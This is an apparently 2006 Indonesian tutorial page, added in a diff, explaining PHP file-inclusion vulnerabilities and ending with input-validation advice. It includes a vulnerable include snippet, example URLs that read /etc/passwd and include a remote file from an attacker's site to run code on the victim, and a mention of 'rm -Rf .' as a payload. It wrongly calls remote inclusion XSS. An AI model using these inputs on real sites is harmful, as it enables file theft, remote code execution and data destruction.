@@ -1,0 +1,178 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>yanmarshus bachtiar :: Masalah Code Injection</title>
+<link type="text/css" rel="stylesheet" href="../artikel.css">
+</head>
+<body>
+
+<div class="logo"><a href="../index.htm" class="linklogo"><b>daunsalam</b>.net</a></div>
+<div class="lisensi">
+Artikel ini dapat digunakan, disalin, dan disebarluaskan.
+Cukup cantumkan sumber asli.
+Jika isinya mengandung kebenaran, semoga memberi kebaikan bagi kita yang memanfaatkannya.
+Jika ada yang salah, mohon kiranya penulis dimaafkan.
+Dan sangat baik, jika kesalahan tersebut dapat diberitahukan kepada penulis.<br>
+Yanmarshus, 10 Mei 2006, yan[at]daunsalam[dot]net
+</div>
+
+<!-- isi mulai -->
+
+<h2>Masalah Code Injection</h2>
+
+<p>
+<font color="#900000">
+Mohon Perhatian. Artikel ini berisi informasi layaknya pisau bermata dua. Maksud utamanya adalah menjelaskan salah satu masalah dalam menulis kode program dengan PHP. Tentu setelah itu, bisa menjadi perhatian agar berhati-hati. Namun otomatis, ini juga memberi pelajaran bagaimana caranya "menggunakan" kelemahan tersebut untuk hal yang bersifat merusak. Dan sungguh, saya mengharapkan tidak dimanfaatkan untuk hal negatif tersebut.
+</font>
+</p>
+
+<p>
+Kita mulai dengan sebuah potongan kode program PHP seperti berikut ini.
+</p>
+
+<pre>
+# file malam.php
+&lt;?php
+echo "Hallo, Selamat Malam";
+?&gt;
+
+# file halo.php
+&lt;?php
+echo "Hallo, Apa Kabar?\n";
+include "malam.php";
+?&gt;
+</pre>
+
+<p>
+Bila file halo.php diakses melalui browser, maka akan kita peroleh kalimat
+</p>
+
+<pre>
+Hallo, Apa Kabar?
+Hallo, Selamat Malam
+</pre>
+
+<p>
+Dengan me-include-kan sebuah file php dalam file php lain, maka file tersebut juga akan dieksekusi. Jadi, seperti contoh di atas, maka dalam file halo.php di-include-kan file malam.php, sehingga kita juga memperoleh apa yang dilakukan oleh file malam.php<br>
+Demikian gambaran sederhana tentang melakukan include dalam program PHP.
+</p>
+
+<p>
+Biasanya cara me-include-kan file lain dalam sebuah program PHP sangat sering dilakukan. Salah satu maksudnya adalah memudahkan dalam menghasilkan sebuah halaman web. Sebuah file php, misalnya bertugas khusus menjadi kerangka untuk file php yang lain. Dan dalam prakteknya tinggal panggil file kerangka ini, lalu kirim variabel ke file tersebut yang berisi nama file lain yang akan ikut ditampilkan melalui file kerangka ini.
+</p>
+
+<p>
+Kecelakaan lalu timbul, karena nama file yang akan diikutkan tersebut dikirim melalui variabel dari luar, misal GET atau POST. Dilengkapi dengan kelalaian tidak melakukan pemeriksaan terlebih dahulu terhadap variabel yang masuk ini, maka celah untuk <i>code injection</i> sudah mulai terbuka. Biasanya berbentuk seperti berikut ini 
+</p>
+
+<pre>
+# file komentar.php
+&lt;?php
+//... kode-kode lain
+$fileisi = $HTTP_GET_VARS['f'];
+include "$fileisi";
+//... kode-kode lain
+?&gt;
+</pre>
+
+<p>
+Untuk mengakses komentar.php di atas, pada addres bar browser akan ditulis seperti ini
+</p>
+
+<pre>
+http://situskorban.com/komentar.php?f=hal2.php
+</pre>
+
+<p>
+maka ditampilkanlah pada browser data yang ada dalam file hal2.php tersebut. Dengan keadaan di atas, maka orang yang mengakses situs tersebut, bisa saja mengganti hal2.php dengan sesuatu yang lain. Misalnya hal2.php diganti dengan /etc/passwd seperti berikut
+</p>
+
+<pre>
+http://situskorban.com/komentar.php?f=/etc/passwd
+</pre>
+
+<p>
+menurut anda apa yang akan tampil pada halaman browser anda ? Jika file /etc/passwd tersebut bisa dibaca oleh PHP, maka artinya isi file tersebut akan muncul di browser. Jelas ini sebuah masalah. Ada sekian banyak orang "tertarik" dengan hal-hal semacam ini, dan kita perlu waspada.
+</p>
+
+<p>
+Sampai pada bagian ini, kita bisa melihat bahayanya adalah orang lain bisa memanfaatkan celah tersebut untuk melihat berbagai file yang mungkin untuk diakses oleh script yang bermasalah tersebut. Kalau kebetulan seseorang tersebut bisa menemukan file yang berisi user dan password. Aha! Itu dia.
+</p>
+
+<p>
+Sekarang kita lanjutkan ceritanya. Jika opsi untuk <i>allow_url_fopen</i> pada file konfigurasi PHP bernilai true (dan default untuk nilai ini memang true) disinilah ancaman itu semakin menganga lebar. Kita kembali ke contoh di atas.
+</p>
+
+<pre>
+http://situskorban.com/komentar.php?f=http://esek2.com/index.htm
+</pre>
+
+<p>
+Nah sekarang kita bisa melihat web http://esek2.com/index.htm berada dalam situs http://situskorban.com/komentar.php
+</p>
+
+<p>
+Lalu di mana bahanya ? Kalau hanya menampilkan situs lain, dan itupun hanya kita sendiri yang terkena dampaknya, tentu tidak ada bahaya. Sebab dengan cara di atas tidak ada perubahan permanen terjadi. Jadi, sampai di sini juga belum ada apa-apanya.
+</p>
+
+<p>
+Sekarang kita buat skenario begini. Kita buat sebuah file php yang isinya sederhana saja, misal
+</p>
+
+<pre>
+# file info.php
+&lt;?php
+phpinfo();
+?&gt;
+</pre>
+
+<p>
+Dan kebetulan lagi kita punya sebuah situs, misalnya kita sebut situs A yang bisa kita isi dengan file ini. Jadi dengan mengakses ke situs A, seperti berikut ini, kita akan memperoleh informasi PHP pada server situs A.
+</p>
+
+<pre>
+http://situsA.com/info.php
+</pre>
+
+<p>
+Lalu, kembali ke situskorban.com yang memiliki celah tadi,
+</p>
+
+<pre>
+http://situskorban.com/komentar.php?f=http://situsA.com/info.php
+</pre>
+
+<p>
+Kita akan mendapatkan halaman tersebut berisi info php yang ternyata masih merupakan info php situsA. Jadi tak ada bahaya. Mengapa ? Karena ketika permintaan dilakukan oleh situskorban.com ke situsA, maka situsA memperlakukan file info.php sebagai file php yang harus dieksekusi terlebih dahulu, baru kemudian hasilnya diberikan ke situskorban.com
+</p>
+
+<p>
+Dan ini dia <b>masalah</b> itu. Sekarang ganti nama file tadi misalnya dengan info.tes. Lalu akses situskorban dengan cara berikut
+</p>
+
+<pre>
+http://situskorban.com/komentar.php?f=http://situsA.com/info.tes
+</pre>
+
+<p>
+<b>Bla!</b> sekarang yang muncul adalah info php dari situskorban. Ini artinya kita sudah bisa menyusupkan script php agar berjalan di situskorban. Coba bayangkan lagi, jika isi dari info.tes tadi adalah script untuk mengganti isi file lain, atau isinya hanyalah sebuah perintah berupa `rm -Rf .` Bisa kiamat! Kira-kira inilah yang bisa disebut dengan <i>Code Injection</i> melalui XSS (Cross Site Scripting)
+</p>
+
+<h3>Antisipasi</h3>
+
+<p>
+Berikut ini cara yang mungkin untuk menghindari kasus seperti di atas :
+</p>
+
+<ul>
+<li>Beri perhatian serius terhadap variabel yang datangnya dari luar.</li>
+<li>Hati-hati terhadap variabel yang datangnya dari luar.</li>
+<li>Periksa dengan teliti terhadap variabel yang datangnya dari luar.</li>
+<li>Sekali lagi, awas variabel yang datang dari luar :) (Paranoid nih...)</li>
+<li>Sebaiknya tidak langsung menggunakan variabel dari luar untuk dieksekusi. Untuk kasus di atas, bisa saja variabel dari luar hanya berupa angka, lalu lakukan swicth untuk memilih halaman yang akan di-include berdasarkan angka tersebut. Jika angka tak valid, langsung saja ke halaman standar, misal menampilkan index.php</li>
+</ul>
+
+<!-- isi selesai -->
+
+</body>
+</html>
